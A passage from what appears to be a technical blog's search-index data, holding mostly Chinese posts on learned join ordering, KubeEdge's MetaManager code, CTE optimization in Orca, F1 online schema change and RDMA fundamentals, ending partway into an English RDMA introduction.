在没有指数结构的先验知识的前提下可以与最优解决方案一比高下。对于固定的动态规划，情况并非如此：例如，left-deep 在 CM1 中产生了良好的计划，但在 CM2 和 CM3 中效果没有那么好。同样，right-deep在 CM1 中没有竞争力，但如果使用 CM2 或 CM3，right-deep 不是最差的。需要注意的是，基于学习的优化器比手动设计的算法更强大，可以适应工作负载、数据或成本模型的变化。 此外，DQ 以比传统动态规划快得多的速度产生了良好的计划： 对于最大的连接（15），DQ 的速度是穷举的 10000 倍，比 zig-zag 快 1000 倍，比 left-deep 和 right-deep 快 10 倍。 Future work本文研究中存在的不足： 奖励值（即J(c)）依赖于数据库系统的代价模型，当代价估计错误时，算法的 join 计划无法达到最优 需要大量的 query 进行训练，估计的 Q 函数的值才能趋向稳定 可以拓展的思路：同样使用强化学习，参考于 SkinnerDB: Regret-Bounded Query Evaluation via Reinforcement Learning，一条 join query 的执行框架如下： 查询时，Pre-Processor 首先通过一元谓词过滤基表，接着由 Join Processor 生成查询的连接顺序与执行结果，最后调用 Post-Processor 对结果进行分组、聚合与排序等操作。 Join Processor 包括 4 部分，Join Processor 将每个连接操作分为多个时间片，每个时间片首先由 Learning Optimizer 选择连接顺序，选中的连接顺序由特定的 Join Executor 执行，每次执行固定时长，并将执行结果加入结果集中。Progress Tracker 跟踪被处理的数据，最后由 Reward Calcultor 计算连接顺序的得分。当所有数据被连接后，完成连接操作。学习优化器使用强化学习领域的上限置信区间算法（UCT），在每个时间片中根据连接顺序的枚举空间生成搜索树，并选择一条路径。UCT 算法的特点即不依赖任何具体示例的参数设置，能够适用于较大的搜索空间。 该算法不需要任何查询上下文及 Cardinality 估计模型。","link":"/2021/02/07/Learning-to-Optimize-Join-Queries-With-Deep-Reinforcement-Learning/"},{"title":"KubeEdge 边缘部分 MetaManager 简析","text":"本文基于 commit 9a7e140b42abb4bf6bcabada67e3568f73964278。 概述MetaManager 是消息处理器，位于 Edged 和 Edgehub 之间，它负责向轻量级数据库 (SQLite) 持久化/检索元数据。 MetaManager 注册和其他模块注册相比，metamanager 注册最大的不同就是它还调用了 initDBTable 在 SQLite 数据库中初始化了两张表 Meta 与 MetaV2： 1234567891011121314151617181920212223242526272829// Meta metadata objecttype Meta struct { Key string `orm:&quot;column(key); size(256); pk&quot;` Type string `orm:&quot;column(type); size(32)&quot;` Value string `orm:&quot;column(value); null; type(text)&quot;`}// MetaV2 record k8s api objecttype MetaV2 struct { // Key is the primary key of a line record, format like k8s obj key in etcd: // /Group/Version/Resources/Namespace/Name //0/1 /2 /3 /4 /5 // /core/v1/pods/{namespaces}/{name} normal obj // /core/v1/pods/{namespaces} List obj // /extensions/v1beta1/ingresses/{namespaces}/{name} normal obj // /storage.k8s.io/v1beta1/csidrivers/null/{name} cluster scope obj Key string `orm:&quot;column(key); size(256); pk&quot;` // GroupVersionResource are set buy gvr.String() like &quot;/v1, Resource=endpoints&quot; GroupVersionResource string `orm:&quot;column(groupversionresource); size(256);&quot;` // Namespace is the namespace of an api object, and set as metadata.namespace Namespace string `orm:&quot;column(namespace); size(256)&quot;` // Name is the name of api object, and set as metadata.name Name string `orm:&quot;column(name); size(256)&quot;` // ResourceVersion is the resource version of the obj, and set as metadata.resourceVersion ResourceVersion uint64 `orm:&quot;column(resourceversion); size(256)&quot;` // Value is the api object in json format // TODO: change to []byte Value string `orm:&quot;column(value); null; type(text)&quot;`} 模块入口edge/pkg/metamanager/metamanager.go： 1234567891011121314151617181920212223func (m *metaManager) Start() { if metaserverconfig.Config.Enable { imitator.StorageInit() go metaserver.NewMetaServer().Start(beehiveContext.Done()) } go func() { period := getSyncInterval() timer := time.NewTimer(period) for { select { case &lt;-beehiveContext.Done(): klog.Warning(&quot;MetaManager stop&quot;) return case &lt;-timer.C: timer.Reset(period) msg := model.NewMessage(&quot;&quot;).BuildRouter(MetaManagerModuleName, GroupResource, model.ResourceTypePodStatus, OperationMetaSync) beehiveContext.Send(MetaManagerModuleName, *msg) } } }() m.runMetaManager()} 启动时，开启两个协程，一个用于定时（默认60s）给自己发送消息通知进行边到云的 podstatus 数据同步（KubeEdge 实现了边缘自治，需要将数据同步到云端，网络断开后如果网络恢复，就能立刻将边端的状态进行反馈）；另一个 runMetaManager 用于 edgehub 与 edged 的消息，然后调用 m.process(msg) 进行处理。 process 函数获取消息的操作的类型，然后根据信息操作类型对信息进行相应处理： 123456789101112131415161718192021222324252627282930func (m *metaManager) process(message model.Message) { operation := message.GetOperation() switch operation { case model.InsertOperation: m.processInsert(message) case model.UpdateOperation: m.processUpdate(message) case model.DeleteOperation: m.processDelete(message) case model.QueryOperation: m.processQuery(message) case model.ResponseOperation: m.processResponse(message) case messagepkg.OperationNodeConnection: m.processNodeConnection(message) case OperationMetaSync: m.processSync() case OperationFunctionAction: m.processFunctionAction(message) case OperationFunctionActionResult: m.processFunctionActionResult(message) case constants.CSIOperationTypeCreateVolume, constants.CSIOperationTypeDeleteVolume, constants.CSIOperationTypeControllerPublishVolume, constants.CSIOperationTypeControllerUnpublishVolume: m.processVolume(message) default: klog.Errorf(&quot;metamanager not supported operation: %v&quot;, operation) }} 具体的处理函数 processInsert、processUpdate 等的具体过程不再分析，大致都是对数据库进行操作，然后再通知 edgehub 或 edged。","link":"/2022/02/25/KubeEdge-%E8%BE%B9%E7%BC%98%E9%83%A8%E5%88%86-MetaManager-%E7%AE%80%E6%9E%90/"},{"title":"Optimization of Common Table Expressions in MPP Database Systems 概述","text":"背景论文基于 Orca 对非递归的 CTE 进行了形式化表达和优化，贡献总结如下： 在查询中使用 CTE 的上下文中优化 CTE 对于查询中的每个 CTE 引用，CTE 不会每次重新优化，仅在需要的时候才进行，例如下推 fitlers 或者 sort 操作 基于 cost 来决定是否对 CTE 进行内联 减少 plan 的搜索空间，加速查询执行，包括下推 predicates 到 CTE，如果 CTE 被引用一次则始终内联，消除掉没有被引用的 CTE 避免死锁，保证 CTE producer 在 CTE consumer 之前执行 REPRESENTATION OF CTEs CTEProducer：一个 CTE 定义对应一个 CTEProducer CTEConsumer：query 中引用 CTE 的地方 CTEAnchor：query 中定义 CTE 的 node，CTE 只能被该 CTEAnchor 的子树中引用 Sequence：按序执行它的孩子节点，先执行左节点，再执行右节点，并把右节点做为返回值 对于此查询： 123WITH v AS (SELECT i_brand FROM item WHERE i_color = ’red’)SELECT * FROM v as v1, v as v2WHERE v1.i_brand = v2.i_brand; 它的 Logical representation 如下所示： 它的 Execution plans 如下所示： PLAN ENUMERATIONCTE 是否内联需要取决于 cost，因此需要枚举出 CTE 在不同引用地方内联前后的计划代价。Orca 中定义了 Memo，下图是初始的逻辑查询在 Memo 中的结构，每个编号就是一个 Memo Group： Transformation RulesTransformation Rules 可以看做 Memo Group 一个输入（或者一个函数），Memo Group 根据这个规则展开产生另一些 expression 放在同一个 Memo Group 中。对于每个 CTE，我们生成内联或不内联 CTE 的备选方案。 第一条规则应用于 CTEAnchor 运算符。它在 Group 0 中生成一个 Sequence 操作符，这样序列的左节点就是表示 CTE 定义的整个 Plan Tree —— 根据需要创建尽可能多的新 Group (Group 4、5和6) —— 序列的右节点就是 CTEAnchor (Group 1) 的原始节点。 第二条规则也应用于 CTEAnchor，生成 Group 0 中的 NoOp 运算符，其孩子节点是 CTEAnchor 的孩子节点（Group 1）。 第三条规则应用于 CTEConsumer 运算符，生成 CTE 定义的副本，该副本与 CTEConsumer 属于同一 Group。例如，Group 2 中的 CTEConsumer，添加了 CTE 定义 Select 操作符，并将其子操作符 TableScan 添加到新Group（Group 7）。 该方法产生的 Plan Tree 的组合中并不都是有效的，比如： a 和 b 都没有 CTEProducer；c 有一个 CTEProducer，没有 CTEConsumer；d 中的 Plan 是有效的，但是只有一个 CTEConsumer 对应于包含的 CTEProducer，是一个失败的 Plan。 通过 Memo 的机制来表达不同的 Plan，基于 cost 选择是否内联。在一个 query 中，CTE 可能有的内联，而有的不内联。内联的好处是能进行普通 query 的优化，比如：下推 predicates，distribution，sorting 等。例如： CTEConsumer 上游有 predicate: i_color=’red’，Orca在默认情况下会将谓词下推，使其从表达式 c 变为表达式 d。 Avoiding Invalid Plans上述产生的 Plan Tree 会很多，所以需要裁剪掉一些无效的 Plan，例如，使用了 CTEConsumer 却没有 CTEProducer。裁剪算法如下： CTESpec 表示一个 CTE 的属性对(id, type)，比如：(1, ‘c’)，cteid = 1，type 是 CTEConsumer。该算法简单来说就是遍历 Tree，检查 CTEConsumer 和 CTEProduct 是否配对。具体描述如下： 先计算自身的 CTESpec； 遍历所有子节点： 计算对于该子节点的 CTESpec 的 Request，输入是：前面兄弟节点以及父节点的 specList，来自父节点的 reqParent，得到该子节点应该满足的 reqChild； 子节点调用该函数 DeriveCTEs(child, reqChild)，递归返回子节点的有效的 CTESpecs，即 specChild； 把子节点 DeriveCTE 返回的 specChild 追加到 specList。如果发现有一对 CTEProducer 和 CTEConsumer就从 specList 中去除掉。 对比遍历所有子节点后得到的 specList 与传入的 reqParent 是否 match。如果匹配，则返回当前的 specList。 Optimizations Across Consumers上述算法可以枚举出所有 CTE 是否内联的 Plan，另外还有一些其他优化 CTE 的方法。 Predicate Push-down123456WITH v as (SELECT i_brand, i_color FROM item WHERE i_current_price &lt; 50)SELECT * FROM v v1, v v2WHERE v1.i_brand = v2.i_brandAND v1.i_color = ’red’AND v2.i_color = ’blue’; 把一个 CTEProducer 对应所有的 CTEConsumer 的 predicates，下推到该 CTEProducer 上，条件通过 OR 组合起来，减少物化的数据量。（注意：因为下推到 CTEProducer 的 predicate 是通过 OR 连接的，因此 CTEConsumer 仍然需要执行原来的 predicate。） Always Inlining Single-use CTEs1234WITH v as (SELECT i_color FROM item WHERE i_current_price &lt; 50)SELECT * FROM vWHERE v.i_color = ’red’; 如果只有一个 CTEConsumer，则始终内联 CTE。 Elimination of unused CTEs1234WITH v as (SELECT i_color FROM item WHERE i_current_price &lt; 50)SELECT * FROM itemWHERE item.i_color = ’red’; CTE v 在上述 query 中没有被使用，这种情况可以消除 CTE。另外，对于如下 query： 123456WITH v as (SELECT i_current_price p FROM item WHERE i_current_price &lt; 50), w as (SELECT v1.p FROM v as v1, v as v2 WHERE v1.p &lt; v2.p)SELECT * FROM itemWHERE item.i_color = ’red’; CTE v 被引用了两次，而 CTE w 从未被引用。因此，我们可以消除 w 的定义。并且，这样做去掉了对 v 的唯一引用，这意味着我们还可以消除 v 的定义。 CONTEXTUALIZED OPTIMIZATION对 CTE 是否内联进行枚举之后，Plan 中不同的 CTEConsumer 可能使用不同的优化方案（内联或不内联、下推等）。 Enforcing Physical PropertiesOrca 通过 top-down 发送处理 Memo Group 中的优化请求来优化候选计划。优化请求是一组表达式要满足的 Physical Properties 上的要求，包括 sort order, distribution, rewindability, CTEs 和 data partitioning 等，也可以没有（即 ANY）。下图以 distribution 为例子，CTE 需要在不同的上下文中满足不同的 Physical Properties。 Sequence 算子对 CTEProducer 发射 ANY 的 prop 请求，返回 Hashed(i_sk) 的 prop（表 item 按 i_sk 这一列进行哈希分布）； 上述的 prop 发送到右子树中（结合自身 prop 和父节点的 prop），右子树中的 HashJoin 节点的连接条件需要子节点的数据基于 i_brand 哈希分布，发送请求到 group 2 和 group 3 的 CTEConsumer 中，而 CTEConsumer 并不满足 i_brand 哈希分布的要求，而父节点又需要此 prop，这时就需要在两个 CTEConsumer 分别添加 Redistribute 的算子，把数据按 i_brand 进行哈希，这样才能满足 HashJoin 的要求。 与 (a) 相比，(b) 中可以一开始就要求 CTE 按 i_brand 哈希分布，CTEProducer 会发现数据分布不满足要求，然后就可以在 group 5 中添加 Redistribute 的算子，CTEProducer 返回 Hashed(i_brand)，这样 CTEConsumer 就不需要加上 Redistribute 的算子，最终得到一个最优的计划（CTEProducer 只需要计算一遍并保存数据，两个 CTEConsumer 意味着需要读取两遍数据）。 Cost EstimationCTEProducer 和 CTEConsumer 的 cost 分开计算： CTEProducer 的 cost 是 CTE 自身的 cost，加上物化写磁盘的 cost CTEConsumer 的 cost 是读取物化结果的 cost，类似 scan 算子 参考 El-Helw A, Raghavan V, Soliman M A, et al. Optimization of common table expressions in mpp database systems[J]. Proceedings of the VLDB Endowment, 2015, 8(12): 1704-1715. 《Optimization of Common Table Expressions in MPP Database Systems》论文导读","link":"/2021/07/13/Optimization-of-Common-Table-Expressions-in-MPP-Database-Systems-%E6%A6%82%E8%BF%B0/"},{"title":"Online, Asynchronous Schema Change in F1","text":"背景分布式数据库 Schema 变更时，由于 Server 获取 Schema 元数据的时机不是同步的，不可避免地会使同一时刻一些 Server 上的 Schema 是旧的，如下图所示。而若变更时禁止 DML 让所有的 Server 都暂停服务，对于大规模分布式数据库，基本没法做到，因为 Schema 变更操作需要花费大量时间，而数据库需要保证 24 小时在线。 例如，增加一个索引 E，Schema 从 S1 变为 S2，有两个节点 A 和 B 分别使用 S1 和 S2： B 添加一行数据，由于它按照 Index E 已经创建完成的 Schema，它会插入两个 KV，RowKV 和 IndexKV A 删除该行数据，由于它按照 Index E 未创建的 Schema，它只会删除 RowKV，IndexKV 就成了孤儿，破坏了数据的完整性 论文思路论文提出了一种 Schema 演进的协议，协议有两个特点： Online——Schema 变更期间，所有 Server 仍然可以读写全部数据 Asynchronous——允许不同 Server 在不同时间点开始使用新版本 Schema 论文把从 Schema 0 到 Schema 1 的突变，替换为一系列相互兼容的小状态变化： 任意两个相邻的小状态（版本）都是兼容的 只有一个 Server 负责 DDL 的执行，其他 Server 只是定期刷新状态（拉取 Schema） 每次 Schema 版本变化间隔不小于一个 Lease 时间，任意时刻，集群中 Server 至多存在两个版本的 Schema。也就是说所有 Server 使用的 Schema 状态都相邻，都是兼容的，经过一系列小状态的转换，就可以实现 Schema 0 到 Schema 1 的变更 schema elements 包括 tables，columns，indexes，constraints，和 optimistic locks 每个 schema element 都有一个与之关联的 state states Absent 状态 完全不感知该 schema element，任何 DML 都不会涉及该 schema element Delete Only 状态 Select 语句不能使用该 schema element Delete 语句在删除时，如果​该 schema element​ 对应的条目存在，要一并删除 Insert 语句在插入​时，不允许插入该 schema element​ 对应的条目 Update 语句在修改时，只允许删除既存的该 schema element​ 对应的条目，但不能插入新的该 schema element​ 对应的条目 Write Only 状态 Select 语句不能使用该 schema element 其他 DML 语句可以正常使用该 schema element、修改该 schema element​ 对应的条目 Reorg 不是一种 schema 状态，而是发生在 write-only 状态之后的一系列操作，保证在索引变为 public 之前所有旧数据的 schema element 都被正确地生成 reorg 要做的就是取到当前时刻的 snapshot，为每条数据补写对应的 schema element 条目即可。当然 reorg 开始之后数据可能发生变更，这种情况下底层 Spanner 提供的一致性能保证 reorg 的写入操作要么失败（说明新数据已提前写入），要么被新数据覆盖 Public 状态 该 schema element 正常工作，所有 DML 都正常使用该 schema element 状态兼容说明 破坏一致性（兼容性）的场景有两种： orphan data anomaly：数据库中包含了按照当前 schema 下不应存在的 KV integrity anomaly：数据库中缺少当前 schema 下应该存在的 KV 为什么 “Absent” 和 “Delete Only” 能够兼容 Absent 状态的 Server 不知道该 schema element 因此不需要该 schema element，不会产生该 schema element 的条目 Delete Only 状态的 Server 知道该 schema element（非 public）但也不需要该 schema element，不会产生该 schema element 的条目 为什么 “Delete Only” 和 “Write Only” 能够兼容 Delete Only 状态和 Write Only 状态的 Server 都知道该 schema element（非 public）但都不需要该 schema element 为什么 “Write Only” 和 “Public” 能够兼容 Write Only 状态的 Server 在该 schema element 的所有已经完整的情况下（通过 Reorg），可以与 Public 兼容 为什么 “Absent” 和 “Write Only” 不兼容 因为 Write Only 会产生新的条目，破坏了 Absent 的条件 为什么 “Delete Only” 和 “Public” 不兼容 因为 Public 有要求所有历史数据有完整的 schema element，Delete Only 状态下并不具备 通俗点举例 假设在增加一个索引 E 的过程中，有如下执行顺序：1）Server A 插入一行 x；2) Server B 删除了行 x；3）Server A 查询 y；4) Server B 查询 y： (1) A 为 Delete Only 状态，B 为 Absent 状态：A 插入了一个 KV（RowKV），B 将 RowKV 删除，A 和 B 在查询时都不会用到 Index E，是兼容的 (2) A 为 Write Only 状态，B 为 Delete Only 状态：A 插入了两个 KV（RowKV 和 IndexKV），B 将 RowKV 和 IndexKV 删除，A 和 B 在查询时都不会用到 Index E，是兼容的 (3) A 为 Public 状态，B 为 Write Only 状态：A 插入了两个 KV（RowKV 和 IndexKV），B 将 RowKV 和 IndexKV 删除；查询时，A 会用到 Index E，B 虽然不会用到 Index E，但数据库中存在 A 的 schema 下应该存在的 IndexKV，所以是兼容的 (4) A 为 Write Only 状态，B 为 Absent 状态：A 插入了两个 KV（RowKV 和 IndexKV），B 感知不到 IndexKV，因此只会删除 RowKV，这一行的 IndexKV 就成了孤儿数据，所以不兼容 (5) A 为 Public 状态，B 为 Delete Only 状态：A 会用到 Index E，B 不会用到 Index E，并且数据库中也不存在 A 的 schema 下的 IndexKV，所以不兼容 参考 Ian Rae, Eric Rollins, Jeff Shute, Sukhdeep Sodhi and Radek Vingralek, Online, Asynchronous Schema Change in F1, VLDB 2013.","link":"/2021/02/13/Online-Asynchronous-Schema-Change-in-F1/"},{"title":"RDMA 基础","text":"RDMA（Remote Direct Memory Access）指的是远程直接内存访问，这是一种通过网络在两个应用程序之间搬运缓冲区里的数据的方法。 Remote：数据通过网络与远程机器间进行数据传输。 Direct：没有内核的参与，有关发送传输的所有内容都卸载到网卡上。 Memory：在用户空间虚拟内存与网卡直接进行数据传输不涉及到系统内核，没有额外的数据移动和复制。 Access：send、receive、read、write、atomic 等操作。 RDMA 与传统的网络接口不同，因为它绕过了操作系统内核。这使得实现了 RDMA 的程序具有如下特点： 绝对的最低时延 最高的吞吐量 最小的 CPU 足迹 （也就是说，需要 CPU 参与的地方被最小化） RDMA 工作原理 RDMA 通信过程中，发送和接收，读/写操作中，都是网卡直接和参与数据传输的已经注册过的内存区域直接进行数据传输，速度快，不需要 CPU 参与，RDMA 网卡接替了 CPU 的工作，节省下来的资源可以进行其它运算和服务。 RDMA 的工作过程如下: 当一个应用执行 RDMA 读或写请求时，不执行任何数据复制。在不需要任何内核内存参与的条件下，RDMA 请求从运行在用户空间中的应用中发送到本地网卡。 网卡读取缓冲的内容，并通过网络传送到远程网卡。 在网络上传输的 RDMA 信息包含目标机器虚拟内存地址和数据本身。请求完成可以完全在用户空间中处理（通过轮询用户空间的 RDMA 完成队列）。RDMA 操作使应用可以从一个远程应用的内存中读数据或向这个内存写数据。 因此，RDMA 可以简单理解为利用相关的硬件和网络技术，网卡可以直接读写远程服务器的内存，最终达到高带宽、低延迟和低资源利用率的效果。应用程序不需要参与数据传输过程，只需要指定内存读写地址，开启传输并等待传输完成即可。 RDMA 数据传输 RDMA Send/Recv跟 TCP/IP 的 send/recv 是类似的，不同的是 RDMA 是基于消息的数据传输协议（而不是基于字节流的传输协议），所有数据包的组装都在 RDMA 硬件上完成的，也就是说 OSI 模型中的下面 4 层（传输层，网络层，数据链路层，物理层）都在 RDMA 硬件上完成。 RDMA ReadRDMA 读操作本质上就是 Pull 操作，把远程系统内存里的数据拉回到本地系统的内存里。 RDMA WriteRDMA 写操作本质上就是 Push 操作，把本地系统内存里的数据推送到远程系统的内存里。 RDMA Write with Immediate Data（支持立即数的 RDMA 写操作）支持立即数的 RDMA 写操作本质上就是给远程系统 Push 带外数据，这跟 TCP 里的带外数据是类似的。可选地，Immediate 4 字节值可以与数据缓冲器一起发送。该值作为接收通知的一部分呈现给接收者，并且不包含在数据缓冲器中。 RDMA 编程基础使用 RDMA，我们需要有一张支持 RDMA 通信（即实现了 RDMA 引擎）的网卡。我们把这种卡称之为 HCA（Host Channel Adapter，主机通道适配器）。通过 PCIe（peripheral component interconnect express）总线， 适配器创建一个从 RDMA 引擎到应用程序内存的通道。一个好的 HCA 将执行的 RDMA 协议所需要的全部逻辑都在硬件上予以实现。这包括分组，重组以及流量控制和可靠性保证。因此，从应用程序的角度看，只负责处理所有缓冲区即可。 如上图所示，在 RDMA 编程中我们使用命令通道调用内核态驱动建立数据通道，该数据通道允许我们在搬运数据的时候完全绕过内核。一旦建立了这种数据通道，我们就能直接读写数据缓冲区。建立数据通道的 API 是一种称之为 verbs 的 API。verbs API 是由一个叫做 Open Fabrics Enterprise Distribution（OFED）的 Linux 开源项目维护的。 关键概念RDMA 操作开始于操作内存。当你在操作内存的时候，就是告诉内核这段内存“名花有主”了，主人就是你的应用程序。于是，你告诉 HCA，就在这段内存上寻址，赶紧准备开辟一条从 HCA 卡到这段内存的通道。我们将这一动作称之为注册一个内存区域 MR（Memory Region）。注册时可以设置内存区域的读写权限（包括 local write，remote read，remote write，atomic，and bind）。调用 Verbs API ibv_reg_mr 即可实现注册 MR，该 API 返回 MR 的 remote 和 local key。local key 用于本地 HCA 访问本地的内存。remote key 是用于提供给远程 HCA 来访问本地的内存。一旦 MR 注册完毕，我们就可以使用这段内存来做任何 RDMA 操作。在下面的图中，我们可以看到注册的内存区域（MR）和被通信队列所使用的位于内存区域之内的缓冲区（buffer）。 RDMA 通信基于三条队列 SQ（Send Queue），RQ（Receive Queue）和 CQ（Completion Queue）组成的集合。其中， 发送队列（SQ）和接收队列（RQ）负责调度工作，他们总是成对被创建，称之为队列对 QP（Queue Pair）。当放置在工作队列上的指令被完成的时候，完成队列（CQ）用来发送通知。 当用户把指令放置到工作队列的时候，就意味着告诉 HCA 那些缓冲区需要被发送或者用来接受数据。这些指令是一些小的结构体，称之为工作请求 WR（Work Request）或者工作队列元素 WQE（Work Queue Element）。一个 WQE 主要包含一个指向某个缓冲区的指针。一个放置在发送队列（SQ）里的 WQE 中包含一个指向待发送的消息的指针；一个放置在接受队列里的 WQE 里的指针指向一段缓冲区，该缓冲区用来存放待接受的消息。 RDMA 是一种异步传输机制。因此我们可以一次性在工作队列里放置好多个发送或接收 WQE。HCA 将尽可能快地按顺序处理这些 WQE。当一个 WQE 被处理了，那么数据就被搬运了。一旦传输完成，HCA 就创建一个状态为成功的完成队列元素 CQE（Completion Queue Element）并放置到完成队列（CQ）中去。如果由于某种原因传输失败，HCA 也创建一个状态为失败的 CQE 放置到（CQ）中去。 简单示例（Send/Recv）第 1 步：系统 A 和 B 都创建了他们各自的 QP 和 CQ，并为即将进行的 RDMA 传输注册了相应的内存区域（MR）。系统 A 识别了一段缓冲区，该缓冲区的数据将被搬运到系统 B 上。系统 B 分配了一段空的缓冲区，用来存放来自系统 A 发送的数据。 第 2 步：系统 B 创建一个 WQE 并放置到它的接收队列（RQ）中。这个 WQE 包含了一个指针，该指针指向的内存缓冲区用来存放接收到的数据。系统 A 也创建一个 WQE 并放置到它的发送队列（SQ）中去，该 WQE 中的指针执行一段内存缓冲区，该缓冲区的数据将要被传送。 第 3 步：系统 A 上的 HCA 总是在硬件上干活，看看发送队列里有没有 WQE。HCA 将消费掉来自系统 A 的 WQE，然后将内存区域里的数据变成数据流发送给系统 B。当数据流开始到达系统 B 的时候，系统 B 上的 HCA 就消费来自系统 B 的 WQE，然后将数据放到该放的缓冲区上去。在高速通道上传输的数据流完全绕过了操作系统内核。 注：WQE 上的箭头表示指向用户空间内存的指针（地址）。receive/send 模式下，通信双方需要事先准备自己的 WQE（WorkQueue），HCA 完成后会写（CQ）。 第 4 步：当数据搬运完成的时候，HCA 会创建一个 CQE。这个 CQE 被放置到完成队列（CQ）中，表明数据传输已经完成。HCA 每消费掉一个 WQE，都会生成一个 CQE。因此，在系统 A 的完成队列中放置一个 CQE，意味着对应的 WQE 的发送操作已经完成。同理，在系统 B 的完成队列中也会放置一个 CQE，表明对应的 WQE 的接收操作已经完成。如果发生错误，HCA 依然会创建一个 CQE。在 CQE 中，包含了一个用来记录传输状态的字段。 在 IB 或 RoCE 中，传送一个小缓冲区里的数据耗费的总时间大约在 1.3µs。通过同时创建很多 WQE, 就能在 1 秒内传输存放在数百万个缓冲区里的数据。 RDMA 操作细节在 RDMA 传输中，Send/Recv 是双边操作，即需要通信双方的参与，并且 Recv 要先于 Send 执行，这样对方才能发送数据，当然如果对方不需要发送数据，可以不执行 Recv 操作，因此该过程和传统通信相似，区别在于 RDMA 的零拷贝网络技术和内核旁路，延迟低，多用于传输短的控制消息。 Write/Read 是单边操作，顾名思义，读/写操作是一方在执行，在实际的通信过程中，Write/Read 操作是由客户端来执行的，而服务器端不需要执行任何操作。RDMA Write 操作中，由客户端把数据从本地 buffer 中直接 push 到远程 QP 的虚拟空间的连续内存块中（物理内存不一定连续），因此需要知道目的地址（remote addr）和访问权限（remote key）。RDMA Read 操作中，是客户端直接到远程的 QP 的虚拟空间的连续内存块中获取数据 pull 到本地目的 buffer 中，因此需要远程 QP 的内存地址和访问权限。单边操作多用于批量数据传输。 可以看出，在单边操作过程中，客户端需要知道远程 QP 的 remote addr 和 remote key，而这两个信息是可以通过 Send/Recv 操作来交换的。 RDMA 单边操作（RDMA READ/WRITE）READ 和 WRITE 是单边操作，只需要本端明确信息的源和目的地址，远端应用不必感知此次通信，数据的读或写都通过 RDMA 在网卡与应用 Buffer 之间完成，再由远端网卡封装成消息返回到本端。 对于单边操作，以存储网络环境下的存储为例，READ 流程如下： 首先 A、B 建立连接，QP 已经创建并且初始化。 数据被存档在 B 的 buffer 地址 VB，注意 VB 应该提前注册到 B 的网卡（并且它是一个 memory region），并拿到返回的 remote key，相当于 RDMA 操作这块 buffer 的权限。 B 把数据地址 VB，key 封装到专用的报文传送到 A，这相当于 B 把数据 buffer 的操作权交给了 A。同时 B 在它的 WQ 中注册进一个 WR，以用于接收数据传输的 A 返回的状态。 A 在收到 B 的送过来的数据 VB 和 remote key 后，网卡会把它们连同自身存储地址 VA 到封装 RDMA READ 请求，将这个消息请求发送给 B，这个过程 A、B 两端不需要任何软件参与，就可以将 B 的数据存储到 A 的 VA 虚拟地址。 A 在存储完成后，会向 B 返回整个数据传输的状态信息。 WRITE 流程与 READ 类似。单边操作传输方式是 RDMA 与传统网络传输的最大不同，只需提供直接访问远程的虚拟地址，无须远程应用参与其中，这种方式适用于批量数据传输。 RDMA 双边操作（RDMA SEND/RECEIVE）RDMA 中 SEND/RECEIVE 是双边操作，即必须要远端的应用感知参与才能完成收发。在实际中，SEND/RECEIVE 多用于连接控制类报文，而数据报文多是通过 READ/WRITE 来完成的。 对于双边操作为例，主机 A 向主机 B（下面简称 A、B）发送数据的流程如下： 首先，A 和 B 都要创建并初始化好各自的 QP，CQ。 A 和 B 分别向自己的 WQ 中注册 WQE，对于 A，WQ = SQ，WQE 描述指向一个等到被发送的数据；对于 B，WQ = RQ，WQE 描述指向一块用于存储数据的 Buffer。 A 的网卡异步调度轮到 A 的 WQE，解析到这是一个 SEND 消息，从 buffer 中直接向 B 发出数据。数据流到达 B 的网卡后，B 的 WQE 被消耗，并把数据直接存储到 WQE 指向的存储位置。 A、B 通信完成后，A 的 CQ 中会产生一个完成消息 CQE 表示发送完成。与此同时，B 的 CQ 中也会产生一个完成消息表示接收完成。每个 WQ 中 WQE 的处理完成都会产生一个 CQE。 双边操作与传统网络的底层 Buffer Pool 类似，收发双方的参与过程并无差别，区别在零拷贝、kernel bypass，实际上对于 RDMA，这是一种复杂的消息传输模式，多用于传输短的控制消息。 参考 RDMA 简介与编程基础 RDMA技术详解（一）：RDMA 概述 RDMA技术详解（二）：RDMA Send Receive操作","link":"/2021/07/28/RDMA-%E5%9F%BA%E7%A1%80/"},{"title":"RDMA Introduction","text":"RDMA (Remote Direct Memory Access) refers to remote direct memory access, which is a method of transferring data in a buffer between two applications over a network. Remote: Data is transferred over a network with remote machines. Direct: Without the participation of the kernel, all information related to sending transmissions is offloaded to the network card. Memory: Data is transferred directly between user space virtual memory and the network card without involving the system kernel, with no additional data movement or copying. Access: Operations such as send, receive, read, write, atomic, etc. RDMA is different from traditional network interfaces because it bypasses the operating system kernel. This gives programs that have implemented RDMA the following characteristics: Absolute minimum latency Highest throughput Smallest CPU footprint (that is, areas where CPU involvement is minimized) RDMA Working Principles During the RDMA communication process, for both sending and receiving, and read/write operations, the network card directly transfers data with the memory region that has already been registered for data transfer. This process is fast, does not require CPU participation, and the RDMA network card takes over the work of the CPU, saving resources for other calculations and services. The working process of RDMA is as follows: When an application performs an RDMA read or write request, it doesn’t perform any data copying. Under the condition that no kernel memory is required, the RDMA request is sent from the application running in user space to the local network card. The network card reads the content of the buffer and transmits it to the remote network card over the network. The RDMA information transmitted over the network includes the virtual memory address of the target machine and the data itself. The completion of the request can be completely handled in user space (by polling the RDMA completion queue in user space). RDMA operations enable applications to read data from or write data to the memory of a remote application. Therefore, RDMA can be simply understood as the use of relevant hardware and network technology, allowing the network card to directly read and write the memory of a remote server, ultimately achieving high bandwidth, low latency, and low resource utilization effects. The application does not need to participate in the data transmission process, it only needs to specify the memory read/write address, start the transmission, and wait for the transmission to complete. RDMA Data Transmission RDMA Send/RecvThis is similar to TCP/IP’s send/recv, but different in that RDMA is based on a message data transfer protocol (not a byte stream transfer protocol), and all packet assemblies are done on RDMA hardware. This means that the bottom 4 layers of the OSI model (Transport Layer, Network Layer, Data Link Layer, Physical Layer) are all completed on RDMA hardware. RDMA ReadThe essence of RDMA read operation is a Pull operation, pulling data from remote system memory back to local system memory. RDMA WriteThe essence of RDMA write operation is a Push operation, pushing data from local system memory to remote system memory. RDMA Write with Immediate Data (RDMA write operation supporting immediate data)RDMA write operation supporting immediate data essentially pushes out-of-band data to the remote system, which is similar to out-of-band data in TCP. Optionally, an Immediate 4-byte value can be sent along with the data buffer. This value is presented as part of the receipt notice to the receiver and is not included in the data buffer. RDMA Programming BasicsTo use RDMA, we need a network card that supports RDMA communication (i.e., implements the RDMA engine). We call this card an HCA (Host Channel Adapter). Through the PCIe (peripheral component interconnect express) bus, the adapter creates a channel from the RDMA engine to the application’s memory. A good HCA will implement all the logic needed for the executed RDMA protocol on hardware. This includes packetization, reassembly as well as traffic control and reliability assurance. Therefore, from the perspective of the application, it only needs to handle all the buffers. 